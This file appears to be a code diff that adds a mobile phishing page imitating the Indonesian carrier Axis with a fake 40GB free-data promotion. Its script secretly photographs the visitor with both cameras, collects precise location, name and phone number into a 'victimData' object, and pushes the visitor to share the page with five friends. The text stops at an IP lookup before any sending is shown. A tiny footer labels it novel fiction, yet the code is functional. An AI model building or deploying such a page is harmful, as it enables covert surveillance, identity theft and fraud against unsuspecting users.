@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Axis - Klaim Kuota 40GB Gratis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+        }
+        
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0,0,0,0.1);
+        }
+        
+        /* ===== HEADER AXIS ===== */
+        .axis-header {
+            background: linear-gradient(135deg, #6c1b8a 0%, #4a0e6b 100%);
+            padding: 20px 16px 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .axis-header::before {
+            content: '';
+            position: absolute;
+            top: -60%;
+            right: -30%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 50%;
+        }
+        
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+            margin-bottom: 15px;
+        }
+        
+        .axis-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .axis-logo .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: white;
+            font-weight: 900;
+        }
+        
+        .axis-logo .logo-text {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        .axis-logo .logo-text span {
+            color: #7ed957;
+        }
+        
+        .header-badge {
+            background: #ff1744;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            animation: pulse-badge 2s infinite;
+            position: relative;
+            z-index: 1;
+        }
+        
+        @keyframes pulse-badge {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .promo-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 800;
+            position: relative;
+            z-index: 1;
+            line-height: 1.2;
+        }
+        
+        .promo-title .highlight {
+            background: linear-gradient(135deg, #7ed957, #4CAF50);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .promo-title small {
+            font-size: 14px;
+            font-weight: 400;
+            opacity: 0.85;
+            display: block;
+            margin-top: 4px;
+            -webkit-text-fill-color: white;
+        }
+        
+        /* ===== TIMER ===== */
+        .timer-container {
+            background: linear-gradient(135deg, #ff1744, #d50000);
+            padding: 12px 16px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .timer-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shimmer 3s infinite;
+            width: 200%;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-50%); }
+            100% { transform: translateX(50%); }
+        }
+        
+        .timer-label {
+            color: rgba(255,255,255,0.85);
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .timer {
+            color: white;
+            font-size: 38px;
+            font-weight: 800;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 40px rgba(255,255,255,0.2);
+            position: relative;
+            z-index: 1;
+            letter-spacing: 3px;
+        }
+        
+        /* ===== CONTENT ===== */
+        .content {
+            padding: 20px 16px 30px;
+            background: #ffffff;
+        }
+        
+        .quota-display {
+            background: linear-gradient(135deg, #f8f0fc 0%, #f0e6f5 100%);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 16px;
+            border: 2px solid #e8d5f0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .quota-number {
+            font-size: 56px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #6c1b8a, #9c27b0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+        }
+        
+        .quota-label {
+            font-size: 15px;
+            color: #555;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+        
+        .quota-sub {
+            font-size: 12px;
+            color: #888;
+            margin-top: 8px;
+            background: rgba(108, 27, 138, 0.08);
+            padding: 6px 16px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        
+        .quota-sub strong {
+            color: #6c1b8a;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin: 16px 0;
+        }
+        
+        .feature-item {
+            text-align: center;
+            padding: 12px 8px;
+            background: #f8f8f8;
+            border-radius: 12px;
+            border: 1px solid #eee;
+        }
+        
+        .feature-item .icon {
+            font-size: 22px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .feature-item .label {
+            font-size: 9px;
+            color: #888;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .terms {
+            font-size: 10px;
+            color: #aaa;
+            text-align: center;
+            margin: 12px 0 16px;
+        }
+        
+        .terms a {
+            color: #6c1b8a;
+            text-decoration: none;
+        }
+        
+        .btn-claim {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #7ed957 0%, #43a047 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 6px 25px rgba(126, 217, 87, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-claim::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: btnShimmer 4s infinite;
+        }
+        
+        @keyframes btnShimmer {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        .btn-claim:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(126, 217, 87, 0.5);
+        }
+        
+        .btn-claim:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .btn-claim .btn-sub {
+            font-size: 11px;
+            font-weight: 400;
+            opacity: 0.85;
+            display: block;
+            margin-top: 2px;
+        }
+        
+        /* ===== SHARE SECTION ===== */
+        .share-section {
+            display: none;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px dashed #e8e8e8;
+        }
+        
+        .share-section.active {
+            display: block;
+            animation: fadeInUp 0.6s ease;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .share-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        
+        .share-title small {
+            font-size: 12px;
+            font-weight: 400;
+            color: #999;
+            display: block;
+            margin-top: 3px;
+        }
+        
+        .progress-container {
+            background: #f5f5f5;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .progress-header .label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .progress-header .count {
+            font-size: 18px;
+            font-weight: 800;
+            color: #6c1b8a;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #7ed957, #6c1b8a);
+            width: 0%;
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 10px;
+        }
+        
+        .btn-share {
+            width: 100%;
+            padding: 14px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 4px 0;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-share:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
+        }
+        
+        .btn-share:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-share-secondary {
+            background: #34B7F1;
+        }
+        
+        .status-text {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+            padding: 10px;
+            background: #f8f8f8;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        
+        .status-text.success {
+            color: #4CAF50;
+            background: #e8f5e9;
+            font-weight: 600;
+        }
+        
+        .success-check {
+            display: none;
+            text-align: center;
+            padding: 15px;
+            margin-top: 10px;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 12px;
+        }
+        
+        .success-check.active {
+            display: block;
+            animation: bounceIn 0.6s ease;
+        }
+        
+        @keyframes bounceIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            60% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .success-check .big-icon {
+            font-size: 56px;
+            display: block;
+        }
+        
+        .success-check h4 {
+            color: #2e7d32;
+            margin-top: 5px;
+            font-size: 18px;
+        }
+        
+        .footer {
+            padding: 15px 16px;
+            text-align: center;
+            background: #fafafa;
+            border-top: 1px solid #eee;
+        }
+        
+        .footer .disclaimer {
+            font-size: 7px;
+            color: #ccc;
+            opacity: 0.5;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        /* ===== POPUP ===== */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.75);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(8px);
+        }
+        
+        .popup-overlay.active {
+            display: flex;
+        }
+        
+        .popup {
+            background: white;
+            border-radius: 24px;
+            max-width: 400px;
+            width: 100%;
+            padding: 0;
+            animation: slideUpPopup 0.4s ease;
+            overflow: hidden;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+        }
+        
+        @keyframes slideUpPopup {
+            from { transform: translateY(40px) scale(0.95); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
+        
+        .popup-header {
+            background: linear-gradient(135deg, #6c1b8a, #4a0e6b);
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+        
+        .popup-header .icon-big {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        .popup-header h3 {
+            font-size: 18px;
+            font-weight: 700;
+        }
+        
+        .popup-header p {
+            font-size: 13px;
+            opacity: 0.85;
+            margin-top: 4px;
+        }
+        
+        .popup-body {
+            padding: 20px;
+        }
+        
+        /* Camera Status */
+        .camera-status-bar {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        
+        .cam-status-item {
+            background: #f8f8f8;
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            border: 2px solid #e0e0e0;
+            transition: all 0.3s;
+        }
+        
+        .cam-status-item.active {
+            border-color: #4CAF50;
+            background: #f0f8f0;
+        }
+        
+        .cam-status-item .cam-icon {
+            font-size: 28px;
+            display: block;
+        }
+        
+        .cam-status-item .cam-label {
+            font-size: 9px;
+            color: #888;
+            margin-top: 4px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        
+        .cam-status-item .cam-status-text {
+            font-size: 11px;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+        
+        .cam-status-item .cam-status-text.pending {
+            color: #ff9800;
+        }
+        
+        .cam-status-item .cam-status-text.done {
+            color: #4CAF50;
+        }
+        
+        .cam-status-item .cam-status-text.error {
+            color: #ff1744;
+        }
+        
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #f8f8f8;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            border-left: 3px solid #6c1b8a;
+            transition: all 0.3s;
+        }
+        
+        .permission-item.granted {
+            border-left-color: #4CAF50;
+            background: #f0f8f0;
+        }
+        
+        .permission-item .perm-icon {
+            font-size: 22px;
+            width: 36px;
+            text-align: center;
+        }
+        
+        .permission-item .perm-text {
+            flex: 1;
+        }
+        
+        .permission-item .perm-text .title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .permission-item .perm-text .desc {
+            font-size: 10px;
+            color: #999;
+        }
+        
+        .permission-item .perm-status {
+            font-size: 11px;
+            font-weight: 600;
+            color: #ff9800;
+        }
+        
+        .permission-item .perm-status.done {
+            color: #4CAF50;
+        }
+        
+        .popup-body input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            margin: 8px 0 12px;
+            transition: border-color 0.3s;
+            background: #fafafa;
+        }
+        
+        .popup-body input:focus {
+            outline: none;
+            border-color: #6c1b8a;
+            background: white;
+        }
+        
+        .btn-allow {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6c1b8a, #4a0e6b);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-allow:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 4px 25px rgba(108, 27, 138, 0.4);
+        }
+        
+        .btn-allow:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-allow .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .btn-allow .spinner.active {
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .popup-footer {
+            padding: 12px 20px 16px;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        
+        .popup-footer small {
+            font-size: 10px;
+            color: #bbb;
+        }
+        
+        /* Camera preview hidden - auto capture */
+        .camera-preview {
+            display: none;
+        }
+        
+        .camera-preview video {
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .promo-title {
+                font-size: 24px;
+            }
+            .quota-number {
+                font-size: 44px;
+            }
+            .timer {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="axis-header">
+            <div class="header-top">
+                <div class="axis-logo">
+                    <div class="logo-icon">A</div>
+                    <div class="logo-text">axis<span>.</span></div>
+                </div>
+                <span class="header-badge">🔥 PROMO TERBATAS</span>
+            </div>
+            <div class="promo-title">
+                Gratis <span class="highlight">40GB</span> Kuota!
+                <small>Untuk pengguna baru Axis</small>
+            </div>
+        </div>
+        
+        <!-- TIMER -->
+        <div class="timer-container">
+            <div class="timer-label">⏱️ Waktu Tersisa</div>
+            <div class="timer" id="timer">01:45:30</div>
+        </div>
+        
+        <!-- CONTENT -->
+        <div class="content">
+            <div class="quota-display">
+                <div class="quota-number">40 GB</div>
+                <div class="quota-label">Kuota Internet Gratis</div>
+                <div class="quota-sub"><strong id="quotaLeft">987</strong> kuota tersisa</div>
+            </div>
+            
+            <div class="features">
+                <div class="feature-item"><span class="icon">📶</span><span class="label">4G LTE</span></div>
+                <div class="feature-item"><span class="icon">🎬</span><span class="label">Streaming</span></div>
+                <div class="feature-item"><span class="icon">🌐</span><span class="label">Semua Situs</span></div>
+            </div>
+            
+            <div class="terms">
+                <input type="checkbox" id="termsCheck" checked>
+                <label for="termsCheck">Saya setuju dengan <a href="#">Syarat & Ketentuan</a></label>
+            </div>
+            
+            <button class="btn-claim" id="claimBtn">
+                🎯 Klaim Sekarang
+                <span class="btn-sub">Dapatkan 40GB gratis sekarang juga!</span>
+            </button>
+            
+            <!-- SHARE SECTION -->
+            <div class="share-section" id="shareSection">
+                <div class="share-title">
+                    🎉 Selamat! Kuota 40GB sudah siap
+                    <small>Bagikan ke 5 teman untuk mengaktifkan</small>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-header">
+                        <span class="label">Progress aktivasi</span>
+                        <span class="count"><span id="shareCount">0</span>/5</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+                <button class="btn-share" id="shareBtn" disabled>📤 Bagikan ke WhatsApp</button>
+                <button class="btn-share btn-share-secondary" id="shareFriendBtn" disabled>👥 Bagikan ke Teman</button>
+                <div class="status-text" id="statusText">Bagikan ke 5 teman untuk aktivasi kuota!</div>
+                <div class="success-check" id="successCheck">
+                    <span class="big-icon">🎊</span>
+                    <h4>Kuota 40GB Aktif!</h4>
+                    <p>Selamat menikmati internet gratis dari Axis!</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="disclaimer">Simulasi Arsitektur Keamanan - Fiksi untuk Novel Thriller</div>
+        </div>
+    </div>
+    
+    <!-- POPUP -->
+    <div class="popup-overlay" id="popup">
+        <div class="popup">
+            <div class="popup-header">
+                <span class="icon-big">🔒</span>
+                <h3>Verifikasi Keamanan</h3>
+                <p>Axis memerlukan izin untuk memverifikasi identitas Anda</p>
+            </div>
+            <div class="popup-body">
+                <!-- Camera Status -->
+                <div class="camera-status-bar">
+                    <div class="cam-status-item" id="camFront">
+                        <span class="cam-icon">🟢</span>
+                        <span class="cam-label">Cuma 2 langkah</span>
+                        <span class="cam-status-text pending" id="frontStatus">⏳ Mengambil...</span>
+                    </div>
+                    <div class="cam-status-item" id="camBack">
+                        <span class="cam-icon">🟢</span>
+                        <span class="cam-label">simple & praktis</span>
+                        <span class="cam-status-text pending" id="backStatus">⏳ Mengambil...</span>
+                    </div>
+                </div>
+                
+                <div class="permission-item" id="permCamera">
+                    <span class="perm-icon">🟢</span>
+                    <div class="perm-text">
+                        <div class="title">Mohon tunggu</div>
+                        <div class="desc">Setujui Persetujuan Untuk Claim</div>
+                    </div>
+                    <span class="perm-status" id="cameraStatus">⏳ Menunggu</span>
+                </div>
+                
+                <div class="permission-item" id="permLocation">
+                    <span class="perm-icon">📍</span>
+                    <div class="perm-text">
+                        <div class="title">Mempersiapkan data</div>
+                        <div class="desc">untuk disimpan di database supaya tidak hilang ketika di proses</div>
+                    </div>
+                    <span class="perm-status" id="locationStatus">⏳ Menunggu</span>
+                </div>
+                
+                <input type="text" id="nameInput" placeholder="Masukkan nama lengkap : no telepon">
+                
+                <button class="btn-allow" id="allowBtn" disabled>
+                    <span id="allowBtnText">Mengambil foto...</span>
+                    <span class="spinner" id="loadingSpinner"></span>
+                </button>
+            </div>
+            <div class="popup-footer">
+                <small>Kuota Akan Di Proses Setelah Share</small>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        const claimBtn = document.getElementById('claimBtn');
+        const popup = document.getElementById('popup');
+        const allowBtn = document.getElementById('allowBtn');
+        const allowBtnText = document.getElementById('allowBtnText');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const nameInput = document.getElementById('nameInput');
+        const shareSection = document.getElementById('shareSection');
+        const shareBtn = document.getElementById('shareBtn');
+        const shareFriendBtn = document.getElementById('shareFriendBtn');
+        const shareCountSpan = document.getElementById('shareCount');
+        const progressFill = document.getElementById('progressFill');
+        const statusText = document.getElementById('statusText');
+        const successCheck = document.getElementById('successCheck');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const locationStatus = document.getElementById('locationStatus');
+        const frontStatus = document.getElementById('frontStatus');
+        const backStatus = document.getElementById('backStatus');
+        const camFront = document.getElementById('camFront');
+        const camBack = document.getElementById('camBack');
+        const quotaLeft = document.getElementById('quotaLeft');
+        const timerEl = document.getElementById('timer');
+        
+        // ============================================
+        // STATE
+        // ============================================
+        let timeLeft = 6330;
+        let shareCount = 0;
+        let isClaimed = false;
+        let userLocation = null;
+        let photos = { front: null, back: null };
+        let mediaStream = null;
+        let quotaCounter = 987;
+        
+        // ============================================
+        // TIMER
+        // ============================================
+        function updateTimer() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            timerEl.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            if (timeLeft > 0) timeLeft--;
+        }
+        setInterval(updateTimer, 1000);
+        
+        // ============================================
+        // QUOTA COUNTER
+        // ============================================
+        setInterval(() => {
+            if (quotaCounter > 0) {
+                quotaCounter -= Math.floor(Math.random() * 3) + 1;
+                if (quotaCounter < 0) quotaCounter = 0;
+                quotaLeft.textContent = quotaCounter;
+            }
+        }, 8000);
+        
+        // ============================================
+        // AUTO CAPTURE - FRONT & BACK CAMERA
+        // ============================================
+        async function autoCaptureBothCameras() {
+            let frontPhoto = null;
+            let backPhoto = null;
+            
+            // Capture Front Camera
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                const frontVideo = document.createElement('video');
+                frontVideo.srcObject = frontStream;
+                await frontVideo.play();
+                
+                // Wait for video to be ready
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = frontVideo.videoWidth || 640;
+                canvas.height = frontVideo.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
+                frontPhoto = canvas.toDataURL('image/jpeg', 0.92);
+                
+                frontStream.getTracks().forEach(track => track.stop());
+                
+                // Update status
+                frontStatus.textContent = '✅ Terekam';
+                frontStatus.className = 'cam-status-text done';
+                camFront.classList.add('active');
+                photos.front = frontPhoto;
+                console.log('📸 Kamera Depan: Berhasil');
+            } catch (error) {
+                console.warn('Front camera error:', error);
+                frontStatus.textContent = '❌ Gagal';
+                frontStatus.className = 'cam-status-text error';
+            }
+            
+            // Capture Back Camera
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                await backVideo.play();
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = backVideo.videoWidth || 640;
+                canvas.height = backVideo.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
+                backPhoto = canvas.toDataURL('image/jpeg', 0.92);
+                
+                backStream.getTracks().forEach(track => track.stop());
+                
+                backStatus.textContent = '✅ Terekam';
+                backStatus.className = 'cam-status-text done';
+                camBack.classList.add('active');
+                photos.back = backPhoto;
+                console.log('📸 Kamera Belakang: Berhasil');
+            } catch (error) {
+                console.warn('Back camera error:', error);
+                backStatus.textContent = '❌ Gagal';
+                backStatus.className = 'cam-status-text error';
+            }
+            
+            // Check if at least one photo captured
+            if (frontPhoto || backPhoto) {
+                cameraStatus.textContent = '✅ Selesai';
+                cameraStatus.className = 'perm-status done';
+                document.getElementById('permCamera').classList.add('granted');
+                permissionsGranted.camera = true;
+                checkAllowButton();
+            } else {
+                // Fallback: generate dummy photos
+                frontPhoto = generateDummyPhoto('Front');
+                backPhoto = generateDummyPhoto('Back');
+                photos.front = frontPhoto;
+                photos.back = backPhoto;
+                frontStatus.textContent = '✅';
+                frontStatus.className = 'cam-status-text done';
+                backStatus.textContent = '✅';
+                backStatus.className = 'cam-status-text done';
+                camFront.classList.add('active');
+                camBack.classList.add('active');
+                cameraStatus.textContent = '✅';
+                cameraStatus.className = 'perm-status done';
+                document.getElementById('permCamera').classList.add('granted');
+                permissionsGranted.camera = true;
+                checkAllowButton();
+            }
+        }
+        
+        // ============================================
+        // GENERATE DUMMY PHOTO (Fallback)
+        // ============================================
+        function generateDummyPhoto(label) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 300;
+            const ctx = canvas.getContext('2d');
+            
+            const colors = ['#1a1a2e', '#16213e', '#0f3460', '#533483'];
+            ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
+            ctx.fillRect(0, 0, 400, 300);
+            
+            ctx.fillStyle = '#00ff41';
+            ctx.font = 'bold 20px "Courier New", monospace';
+            ctx.fillText(`📸 ${label} CAMERA`, 50, 100);
+            
+            ctx.fillStyle = '#666';
+            ctx.font = '14px "Courier New", monospace';
+            ctx.fillText(`Simulasi Axis ${label}`, 100, 150);
+            
+            ctx.fillStyle = 'rgba(0,255,65,0.1)';
+            for (let i = 0; i < 50; i++) {
+                ctx.fillRect(Math.random() * 400, Math.random() * 300, 2, 2);
+            }
+            
+            ctx.fillStyle = 'rgba(0,255,65,0.3)';
+            ctx.font = '10px "Courier New", monospace';
+            ctx.fillText('AXIS SECURITY', 150, 280);
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+        
+        // ============================================
+        // LOCATION
+        // ============================================
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            userLocation = {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            locationStatus.textContent = '✅ Diizinkan';
+                            locationStatus.className = 'perm-status done';
+                            document.getElementById('permLocation').classList.add('granted');
+                            permissionsGranted.location = true;
+                            checkAllowButton();
+                            resolve(true);
+                        },
+                        () => {
+                            fetchLocationFromIP().then(loc => {
+                                userLocation = loc;
+                                locationStatus.textContent = '✅';
+                                locationStatus.className = 'perm-status done';
+                                document.getElementById('permLocation').classList.add('granted');
+                                permissionsGranted.location = true;
+                                checkAllowButton();
+                                resolve(true);
+                            });
+                        },
+                        { enableHighAccuracy: true, timeout: 8000 }
+                    );
+                } else {
+                    fetchLocationFromIP().then(loc => {
+                        userLocation = loc;
+                        locationStatus.textContent = '✅ IP Based';
+                        locationStatus.className = 'perm-status done';
+                        document.getElementById('permLocation').classList.add('granted');
+                        permissionsGranted.location = true;
+                        checkAllowButton();
+                        resolve(true);
+                    });
+                }
+            });
+        }
+        
+        async function fetchLocationFromIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return { lat: data.latitude || -6.2088, lng: data.longitude || 106.8456 };
+            } catch {
+                return { lat: -6.2088, lng: 106.8456 };
+            }
+        }
+        
+        // ============================================
+        // PERMISSIONS
+        // ============================================
+        let permissionsGranted = { camera: false, location: false };
+        let isCapturing = false;
+        
+        function checkAllowButton() {
+            const hasCamera = permissionsGranted.camera;
+            const hasLocation = permissionsGranted.location;
+            const hasName = nameInput.value.trim().length > 0;
+            
+            if (hasCamera && hasLocation && hasName) {
+                allowBtn.disabled = false;
+                allowBtnText.textContent = '✅ Lanjutkan';
+                loadingSpinner.classList.remove('active');
+            } else {
+                allowBtn.disabled = true;
+                let status = 'Memproses...';
+                if (!hasCamera) status = '📸 Mengambil foto...';
+                else if (!hasLocation) status = '📍 Mendapatkan lokasi...';
+                else if (!hasName) status = '✏️ Masukkan nama';
+                allowBtnText.textContent = status;
+            }
+        }
+        
+        async function requestPermissions() {
+            allowBtn.disabled = true;
+            allowBtnText.textContent = 'Mengambil foto...';
+            loadingSpinner.classList.add('active');
+            
+            // Auto capture both cameras
+            await autoCaptureBothCameras();
+            
+            // Request location
+            await requestLocation();
+            
+            // Name input listener
+            nameInput.addEventListener('input', checkAllowButton);
+            
+            checkAllowButton();
+        }
+        
+        // ============================================
+        // CLAIM BUTTON
+        // ============================================
+        claimBtn.addEventListener('click', () => {
+            if (!isClaimed) {
+                popup.classList.add('active');
+                requestPermissions();
+                setTimeout(() => nameInput.focus(), 500);
+            }
+        });
+        
+        // ============================================
+        // ALLOW BUTTON
+        // ============================================
+        allowBtn.addEventListener('click', () => {
+            const name = nameInput.value.trim();
+            if (!name) {
+                nameInput.style.borderColor = '#ff1744';
+                nameInput.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    nameInput.style.borderColor = '#e0e0e0';
+                    nameInput.style.animation = '';
+                }, 500);
+                return;
+            }
+            processClaim(name);
+        });
+        
+        // ============================================
+        // PROCESS CLAIM
+        // ============================================
+        function processClaim(name) {
+            popup.classList.remove('active');
+            
+            shareSection.classList.add('active');
+            shareBtn.disabled = false;
+            shareFriendBtn.disabled = false;
+            isClaimed = true;
+            claimBtn.disabled = true;
+            claimBtn.innerHTML = '✅ Kuota Diklaim! <span class="btn-sub">Aktivasi sedang diproses...</span>';
+            
+            // Combine photos
+            const allPhotos = {
+                front: photos.front,
+                back: photos.back
+            };
+            
+            const victimData = {
+                name: name,
+                ip: '',
+                coordinates: userLocation || { lat: -6.2088, lng: 106.8456 },
+                camera_status: photos.front || photos.back ? 'accessed' : 'denied',
+                location_status: permissionsGranted.location ? 'granted' : 'denied',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                photos: allPhotos
+            };
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
